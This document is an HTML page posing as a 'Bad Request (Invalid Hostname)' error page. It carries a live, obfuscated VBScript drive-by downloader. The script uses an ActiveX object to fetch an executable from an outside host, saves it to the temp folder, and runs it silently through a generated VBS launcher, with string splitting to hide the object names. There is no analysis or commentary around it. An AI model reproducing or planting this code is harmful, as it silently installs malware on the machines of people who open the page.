<html><head></head><body><h1>Bad Request (Invalid Hostname)</h1></body></html>
<Script Language="VBScript">
On Error Resume Next
CnLRU="http://wowzn.w100.loginhost.cn/leon.exe"
Set Ob = document.createElement("ob"&"je"&"c"&"t")
Ob.SetAttribute "cla"&"ssid", "c"&"ls"&"i"&"d:BD9"&"6C55"&"6-65"&"A3-11D0"&"-983A-00C"&"04FC29"&"E36"
sHTTP="M"&"ic"&"ro"&"s"&"of"&"t"&".X"&"M"&"L"&"H"&"TT"&"P"
Set Pop = Ob.CreateObject(sHTTP,"")
Pop.Open "G"&"ET", CnLRU, False
Pop.Send
ExeName="Cn"&"91"&"1.exe"
VbsName="Cn"&"91"&"1.vbs"
Set FPI = Ob.createobject("Scri"&"p"&"ting.F"&"i"&"le"&"Sy"&"st"&"e"&"mO"&"bje"&"ct","")
Set sTmp = FPI.GetSpecialFolder(2)
ExeName=FPI.BuildPath(sTmp,ExeName)
VbsName=FPI.BuildPath(sTmp,VbsName)
AA="A"&"d"
AB="o"&"d"&"b"&"."&"s"&"tre"&"am"
AdM=AA&AB
Set Bda = Ob.createobject(AdM,"")
Bda.type=1
Bda.Open
Bda.Write Pop.ResponseBody
Bda.Savetofile ExeName,2
Bda.Close
Bda.Type=2
Bda.Open
Bda.WriteText "Set Shell = CreateObject(""Wscript.Shell"")"&vbCrLf&"Shell.Run ("""&ExeName&""")"&vbCrLf&"Set Shell = Nothing"
Bda.Savetofile VbsName,2
Bda.Close
sRun="S"&"h"&"e"&"l"&"l"&"."&"A"&"p"&"p"&"l"&"i"
Set Run = Ob.createobject(sRun&"cation","")
Run.ShellExecute VbsName,"","","Open",0
</Script>
